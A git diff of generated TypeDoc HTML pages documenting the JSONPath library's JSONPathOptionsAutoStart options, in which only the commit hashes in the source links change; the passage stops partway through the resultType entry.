class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>callback?</span></a>\n <a href=\"JSONPathOptionsAutoStart.html#eval\" class=\"tsd-index-link tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>eval?</span></a>\n <a href=\"JSONPathOptionsAutoStart.html#flatten\" class=\"tsd-index-link tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>flatten?</span></a>\n\n@@ -16,7 +16,7 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default\" class=\"tsd-anchor\"></a>Default<a href=\"#Default\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">true</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Overrides <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#autostart\">autostart</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L159\">jsonpath.d.ts:159</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"callback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>callback</span><a href=\"#callback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>If supplied, a callback will be called immediately upon retrieval of\n+</div></div><aside class=\"tsd-sources\"><p>Overrides <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#autostart\">autostart</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L159\">jsonpath.d.ts:159</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"callback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>callback</span><a href=\"#callback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>If supplied, a callback will be called immediately upon retrieval of\n an end point value.</p>\n <p>The three arguments supplied will be the value of the payload\n (according to <code>resultType</code>), the type of the payload (whether it is\n\n@@ -25,7 +25,7 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-1\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">undefined</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#callback\">callback</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L140\">jsonpath.d.ts:140</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"eval\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>eval</span><a href=\"#eval\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">eval</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span></div><div class=\"tsd-comment tsd-typography\"><p>Script evaluation method.</p>\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#callback\">callback</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L140\">jsonpath.d.ts:140</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"eval\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>eval</span><a href=\"#eval\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">eval</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span></div><div class=\"tsd-comment tsd-typography\"><p>Script evaluation method.</p>\n <p><code>safe</code>: In browser, it will use a minimal scripting engine which doesn't\n use <code>eval</code> or <code>Function</code> and satisfies Content Security Policy. In NodeJS,\n it has no effect and is equivalent to native as scripting is safe there.</p>\n\n@@ -40,20 +40,20 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-2\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-2\">&#39;safe&#39;</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#eval\">eval</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L102\">jsonpath.d.ts:102</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"flatten\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>flatten</span><a href=\"#flatten\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">flatten</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether the returned array of results will be flattened to a\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#eval\">eval</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L102\">jsonpath.d.ts:102</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"flatten\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>flatten</span><a href=\"#flatten\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">flatten</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether the returned array of results will be flattened to a\n single dimension array.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-3\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-3\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">false</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#flatten\">flatten</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L40\">jsonpath.d.ts:40</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"ignoreEvalErrors\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>ignore<wbr/>Eval<wbr/>Errors</span><a href=\"#ignoreEvalErrors\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">ignore<wbr/>Eval<wbr/>Errors</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Ignore errors while evaluating JSONPath expression.</p>\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#flatten\">flatten</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L40\">jsonpath.d.ts:40</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"ignoreEvalErrors\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>ignore<wbr/>Eval<wbr/>Errors</span><a href=\"#ignoreEvalErrors\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">ignore<wbr/>Eval<wbr/>Errors</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Ignore errors while evaluating JSONPath expression.</p>\n <p><code>true</code>: Don't break entire search if an error occurs while evaluating JSONPath expression on one key/value pair.</p>\n <p><code>false</code>: Break entire search if an error occurs while evaluating JSONPath expression on one key/value pair.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-4\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-4\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">false</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#ignoreEvalErrors\">ignoreEvalErrors</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L113\">jsonpath.d.ts:113</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"json\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>json</span><a href=\"#json\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSON object to evaluate (whether of null, boolean, number,\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#ignoreEvalErrors\">ignoreEvalErrors</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L113\">jsonpath.d.ts:113</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"json\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>json</span><a href=\"#json\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSON object to evaluate (whether of null, boolean, number,\n string, object, or array type).</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#json\">json</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L26\">jsonpath.d.ts:26</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"otherTypeCallback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>other<wbr/>Type<wbr/>Callback</span><a href=\"#otherTypeCallback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>In the current absence of JSON Schema support,\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#json\">json</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L26\">jsonpath.d.ts:26</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"otherTypeCallback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>other<wbr/>Type<wbr/>Callback</span><a href=\"#otherTypeCallback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>In the current absence of JSON Schema support,\n one can determine types beyond the built-in types by adding the\n perator <code>@other()</code> at the end of one's query.</p>\n <p>If such a path is encountered, the <code>otherTypeCallback</code> will be invoked\n\n@@ -63,20 +63,20 @@\ntransformations and return false).</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-5\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-5\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><p>undefined\n &lt;A function that throws an error when <code>@other()</code> is encountered&gt;</p>\n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#otherTypeCallback\">otherTypeCallback</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L155\">jsonpath.d.ts:155</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"parent\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent</span><a href=\"#parent\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#otherTypeCallback\">otherTypeCallback</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L155\">jsonpath.d.ts:155</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"parent\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent</span><a href=\"#parent\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n this allows the parent of that root node to be returned within results.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-6\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-6\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">null</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#parent\">parent</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L120\">jsonpath.d.ts:120</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"parentProperty\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent<wbr/>Property</span><a href=\"#parentProperty\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent<wbr/>Property</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#parent\">parent</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L120\">jsonpath.d.ts:120</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"parentProperty\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent<wbr/>Property</span><a href=\"#parentProperty\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent<wbr/>Property</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n this allows the parentProperty of that root node to be returned within\n results.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-7\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-7\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">null</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#parentProperty\">parentProperty</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L128\">jsonpath.d.ts:128</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"path\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>path</span><a href=\"#path\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSONPath expression as a (normalized or unnormalized) string or\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#parentProperty\">parentProperty</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L128\">jsonpath.d.ts:128</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"path\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>path</span><a href=\"#path\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSONPath expression as a (normalized or unnormalized) string or\n array.</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#path\">path</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L21\">jsonpath.d.ts:21</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"resultType\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>result<wbr/>Type</span><a href=\"#resultType\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">result<wbr/>Type</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span 